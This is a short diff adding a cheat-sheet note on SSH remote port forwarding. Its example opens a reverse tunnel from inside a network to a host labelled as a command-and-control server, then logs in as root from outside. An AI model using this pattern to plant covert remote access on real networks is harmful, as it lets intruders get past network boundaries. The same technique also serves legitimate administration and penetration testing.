@@ -1,0 +1,15 @@
+SSH
+
+> ssh -R [bind address:]port:host:hostport
+
+the R switch defines the port that the remote side will connect over.
+
+eg.
+
+Inside network
+
+> ssh -fN -R 7000:localhost:22 username@<c&c\_server>
+
+Outside network
+
+> ssh -p 7000 root@localhost
